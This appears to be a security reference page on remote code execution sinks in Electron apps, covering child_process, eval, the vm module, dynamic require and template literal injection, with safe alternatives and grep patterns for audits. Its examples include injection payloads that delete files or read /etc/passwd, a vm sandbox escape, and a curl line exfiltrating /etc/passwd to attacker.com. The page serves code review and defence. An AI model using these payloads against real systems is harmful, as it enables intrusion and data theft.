---
title: RCE Sinks
description: Remote code execution sinks in Electron — child_process, eval, dynamic require, and exploitation techniques
---

# RCE Sinks

RCE (Remote Code Execution) sinks are operations that, when fed attacker-controlled data, result in arbitrary code execution. In Electron, the distinction between "renderer RCE" and "main process RCE" matters — but both are critical.

---

## child_process Module

The Node.js `child_process` module is the primary RCE primitive. It exists in the main process and in any renderer with `nodeIntegration: true`.

### exec / execSync — Shell Command Injection

```javascript
const { exec, execSync } = require('child_process');

// Shell interpretation — injection via shell metacharacters:
exec(`convert "${userFile}" output.png`);
// userFile = '"; rm -rf /; echo "'  → RCE

exec(`grep "${userQuery}" /app/data/*`);
// userQuery = '" /etc/passwd; ls #' → file read

// execSync is synchronous but same risk:
const output = execSync(`ping ${host}`);
// host = '127.0.0.1; cat /etc/passwd' → RCE
```

**Root cause:** `exec()` passes the command to the shell (`/bin/sh -c` on Unix, `cmd.exe /c` on Windows). The shell interprets metacharacters: `;`, `|`, `&&`, `||`, `` ` ``, `$()`, `"`, `'`.

**Safe alternative:** `spawn()` or `execFile()` with argument arrays — no shell, no injection:
```javascript
// Safe: no shell, args are separate:
spawn('convert', [userFile, 'output.png']);
execFile('grep', [userQuery, '/app/data/file.txt']);
```

### spawn — Less Dangerous But Still Risks

```javascript
const { spawn } = require('child_process');

// Safe when args array is used correctly:
spawn('ls', ['-la', userDir]);   // OK: no shell, userDir is just a string arg

// DANGEROUS — shell: true option:
spawn('ls', [userDir], { shell: true });  // shell invoked → injection possible

// DANGEROUS — command built from user input:
spawn(`/bin/bash -c "ls ${userDir}"`);   // string form invokes shell
```

### fork — For Node.js Subprocesses

```javascript
// fork() spawns a new Node.js process to run a JS file:
const { fork } = require('child_process');

fork(userScript);   // userScript = '/path/to/arbitrary.js' → arbitrary JS exec
```

---

## eval and Dynamic Code Execution

### eval()

```javascript
// Direct eval — executes arbitrary JS in current scope:
const userInput = "require('child_process').exec('calc')";
eval(userInput);  // RCE

// Indirect eval (slightly different scoping, same security risk):
const geval = eval;
geval(userInput);  // RCE
```

### Function Constructor

```javascript
// new Function() — creates a function from a string:
const fn = new Function('return require("child_process").exec("calc")');
fn();  // RCE

// With parameters:
const fn2 = new Function('x', `return eval(x)`);
fn2(maliciousCode);
```

### vm Module

```javascript
const vm = require('vm');

// vm.runInNewContext — "sandboxed" but escapable:
vm.runInNewContext(userCode, {});
// Node.js vm module is NOT a security sandbox
// Escape: accessing constructor chain to get require

// Classic vm escape:
const escapeCode = `
  const fn = this.constructor.constructor;
  fn('return process')().mainModule.require('child_process').exec('calc');
`;
vm.runInNewContext(escapeCode, {});  // RCE despite "sandbox"
```

**Key insight:** Node.js `vm` is for code isolation/context separation, NOT security sandboxing. Do not use it as a security control.

---

## Dynamic require()

```javascript
// Allows loading arbitrary modules including built-ins:
const modName = userInput;  // attacker controls module name
const mod = require(modName);

// Scenarios:
require('child_process')  // attacker supplies module name → full Node access
require('/tmp/evil.js')   // absolute path → load arbitrary JS file
require('../../../evil')  // relative path traversal
```

This is especially dangerous in plugin systems:

```javascript
// Plugin loader — VULNERABLE:
function loadPlugin(pluginPath) {
  const plugin = require(path.join(PLUGIN_DIR, pluginPath));
  plugin.init();
}
// pluginPath = '../../main' → loads main.js
// pluginPath = '../../../../../tmp/evil' → loads arbitrary JS
```

---

## Template Literal Injection

```javascript
// Template literals with user data passed to exec:
const cmd = `ffmpeg -i ${inputFile} -o ${outputFile}`;
exec(cmd);

// inputFile = 'video.mp4; curl http://attacker.com/$(cat /etc/passwd) -o /dev/null'
// → command injection + data exfil
```

---

## WebAssembly

```javascript
// WebAssembly can be used to bypass some CSP eval restrictions:
const wasmCode = new Uint8Array([/* attacker-controlled wasm bytes */]);
const wasmModule = new WebAssembly.Module(wasmCode);
const instance = new WebAssembly.Instance(wasmModule, {
  imports: { exec: (ptr) => /* call back to JS */ }
});
// Not directly RCE but can be part of a chain bypassing CSP script-src
```

---

## Exploitation Context

The path to exploitation depends on where the sink lives:

| Sink Location | Preconditions | Impact |
|--------------|---------------|--------|
| Main process | IPC from renderer (attacker controls message) | Direct OS command exec |
| Main process | Attacker can reach IPC handler (any renderer) | Same |
| Renderer, `nodeIntegration: true` | XSS in renderer | Immediate RCE |
| Renderer, `contextIsolation: false` | XSS + access to Node.js globals | RCE |
| Renderer, sandboxed | XSS → IPC → over-privileged handler | Escalated RCE |

---

## Grep Patterns

```bash
# All child_process usages:
grep -rn "require.*child_process\|child_process\.exec\|\.execSync\|\.spawn\b\|\.spawnSync\|\.fork\b" \
  --include="*.js" . | grep -v node_modules

# eval variants:
grep -rn "\beval\s*(\|new Function\s*(\|vm\.run" --include="*.js" . | grep -v node_modules

# Template literal + exec combination:
grep -rn "exec\s*\`\|exec\s*(\s*\`" --include="*.js" . | grep -v node_modules

# Dynamic require:
grep -rn "require\s*(\s*[a-z_$][a-z0-9_$]*\s*)" --include="*.js" . | \
  grep -v "require\s*(['\"]" | grep -v node_modules
```
